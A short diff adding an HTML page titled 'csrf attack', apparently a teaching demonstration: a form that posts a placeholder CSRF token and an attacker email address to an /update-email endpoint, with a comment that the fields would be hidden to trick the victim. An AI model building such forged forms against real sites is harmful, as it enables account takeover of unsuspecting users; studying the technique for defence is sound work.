@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>csrf attack</title>
+</head>
+<body>
+    <form action="/update-email" method="POST">
+        (the following two inputs are going to be hidden (type="hidden"), because this is the attack, and we want to trick the victim)
+        <input type="text" name="_csrf" value="malicious-csrf-token">
+        <input type="text" name="email" value="attacker@example.com">
+        <input type="submit" value="Update Email">
+    </form>
+</body>
+</html>
